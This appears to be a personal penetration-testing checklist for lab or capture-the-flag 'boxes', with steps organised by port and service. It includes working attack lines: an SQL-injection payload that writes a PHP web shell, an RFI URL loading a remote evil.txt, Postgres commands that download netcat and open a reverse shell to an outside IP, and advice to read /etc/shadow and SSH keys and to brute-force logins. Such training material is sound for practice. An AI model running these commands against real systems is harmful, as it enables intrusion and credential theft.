# Box Solving Methodology 

## Initial Enumeration
- [ ] Port Scanning
  - Run a vuln scan on all ports using: `nmap -p- -Pn -sCV <host>`
  - Check for the services enumerated by nmap on each port and take notes seperately for each service: `Port 80 - Tomcat 8.x`
  - If version is not enumerated by nmap google the service name and check if it has any publicly available exploits. Like in below example nmap enumerated only `gopher` but not the version, so it's wise to google "Gopher Exploits" and check if there are any prioritise the code execution ones. If any, add it in the notes of respective port. 

    `70/tcp  open gopher`
    
   - Telnet the service to find the exact version and try finding the exploit of that version on Google, Searchsploit etc.
   - Once you are done scanning TCP ports, run UDP scan from nmap for top 100 ports initially as it takes alot of time.

## Port Wise Enumeration
  - **Port 80,443 or anyother webserver port**
     
     - [ ] Run nikto and look for any vulnerabilities flagged like shellshock or CVE: 
     
     `nikto -h <target>:<port>`
     
     - [ ] Run dir search and look for any exposed files. Look into the files and check the content. Your common loot can be Usernames, Passwords(rare), Version of hosted services(most likely), or any other configuration files. If Directory listing is enabled for one of the directories and the service is opensource try looking out the content on github, to see what can be sensitive (to avoid going through each file manually): 
     
     `python3 /path/to/dirsearch/dirsearch.py -u http://target.com -e all -t 400` 
     
     #### Warning: Don't fall for running exhaustive dictionaries at once. Initially just start with the default one. 
       
       - [ ] View page source **on each page** and look for comments, vulnerable plugins and versions of various web technologies like CMS, 3rd party plugins etc.
       - [ ] Manually crawl all the application and take notes of any usernames, IDs etc.
       - [ ] If login portal try below:
          -  SQL injection to bypass auth.
          -  Weak credentials (admin/admin, default creds, generate wordlist with cewl)
       - [ ] If you have found LFI via some exploit, try below:
          - Reading common files like `/etc/passwd` ,`/etc/shadow`, `~/.ssh/authorized_keys` , `/var/lib/samba/private/passdb.tdb`, `/etc/samba/smb.conf` or other files like config, logs etc. Also search for services on that particular box and see if they store user/pass on some common location and try reading them. 
          - Also, extract usernames from `/etc/passwd` and bruteforce ssh/ftp/smb or anyother applicable service using usernames as password and weak passwords like password, admin, etc. Bruteforcing with `rockyou.txt` not recommended unless you feel it is the only way. 
          - Use PHP Wrappers for command execution.
          - Try locating functionality to upload a shell, and access it through LFI.
          - Try escalating to RFI, If yes:
           first generate a simple HTTP request to your owned server to enusre the existence of vulnerability. Once done, we can run arbitrary commands using various payloads:
           
                  - Always use various type of shells, for example in php use different functions like system, shell_exec, popen, passthru to gain shell. (useful resource: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php)
                  - Improvise with the server environment and use shells of various languages as well.
                  - Sample command: `http://<target>/sample.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig`
                  - Use curl or web proxies to exploit these kind of vulnerabilities, as sometime application don't throw errors on web browser but errors do come in response of web request.
  
       - [ ] If you got an SQL injection and know the exact path of web root folder, you may get a shell like: ` ' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
  URL Encoded: '+UNION+SELECT+("<%3Fphp+echo+passthru(%24_GET['cmd'])%3B")+INTO+OUTFILE+'C%3A%2Fxampp%2Fhtdocs%2Fcmd.php'++--+-'`
     - [ ] Always read an exploit before usage, and use enumerated ports for reverse connections.
     - [ ] Always first confirm exploit with some sort of sanity check like a simple http request and then move towards gaining reverse/bind shell. Try various methods and languages to get shell on the victim machine.
    - [ ] For Node Js application check for eval function by inserting 1+1.
    
- **Port 21 - FTP Enumeration:**
  - [ ]  Anonymous Login (anonymous/anonymous)
  - [ ]  Weak Credentials. Try gathered username, weak passwords etc.
  - [ ]  System File Read/Write
  - [ ]  PUT method allowed? If yes, then find LFI in the web app. Upload the shell via ftp and trigger it from Web.
  - [ ]  CVE


- **Port 22 - SSH Enumeration:**
  - [ ] Weak Credentials. Try gathered username, weak passwords etc.
  - [ ] Credentials Reuse found in earlier part of assessment
  - [ ] OpenSSH 4.x has a CVE where public RSA/DSA keys can be bruteforced if private keys are known, more details on: https://github.com/g0tmi1k/debian-ssh.
  - [ ] CVE
  - [ ] Sensitive Files:
      -  /.ssh/authorized_keys
      - /.ssh/id_rsa
      - /.ssh/id_rsa.pub


- **Port 139,445 - SMB Enumeration:**
  - [ ] SMB share to read sensitive files.
  - [ ] CVE against samba version.
  - [ ] Symlink attack to mount root share on smb share.
  - [ ] Use wireshark to sniff exact Samba version.
  - [ ] Anonymous login. `smbclient -L //192.168.54.122/ -N`
  - [ ] `smbclient \\\\192.168.201.125\\Commander -p 12445` for login into smbshare
  - [ ] Weak Credentials/Credentials Reuse.


- **Port 3306 - MYSQL**
  - [ ] Credential reuse to login into mysql and read database users or create a login as well. Also, shell commands can be run as a result.
  - [ ] `select do_system('id');` to run system commands from mysql shell.
  - [ ] Incase of sql injection: `' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'`
  - [ ] If MYSQL is running as root, you can abuse UDF exploit for privelege escalation. (Reference: `https://www.trenchesofit.com/2021/02/15/offensive-security-proving-grounds-banzai-write-up-no-metasploit/)`. While exploiting UDF you may find size smaller than 0 error, i fixed it by changing the binary name.

- **Port 3389 - RDP**
  - [ ]  Weak Creds/ Credential Reuse.

- **Port 69 - TFTP**
  -  requires no pre authentication.
  -  old protocol to read files. Need to convert path to notation 8 in order to work or use `atftp` to get it working.   

- **Port 5432 - POSTGRES**
  - [ ] Default creds are postgres:postgres
  - [ ] We can create table to execute cmd, like below:
    - `CREATE TABLE cmd_exec(cmd_output text);`
    - `COPY cmd_exec FROM PROGRAM 'wget http://192.168.234.30/nc';`
    - `DELETE FROM cmd_exec;`
    - `COPY cmd_exec FROM PROGRAM 'nc -n 192.168.234.30 5437 -e /usr/bin/bash';`
  - [ ] Else if we can't create table we can read local files and list dirs via:
    - `select * from pg_ls_dir('/tmp');`
    - `select * from pg_read_file('/etc/passwd' , 0 , 1000000);`
  -  Reference: `https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection`


- **Port 27017 - MongoDB**
  - [ ] mongo mongodb://<ip>:<port> - Check for password less login
  - [ ] Commands:
    - `show db`
    - `show table`
    - `db.table.find().pretty()`
    - `db.users.update({_id:ObjectId("5f73c575eae85a15b8df908d"}), {$set: {"password":"1df38cbe202365fc6f2265391ef6aad4e52c7c09ce837bd191e4081b8749e341"}})`
  
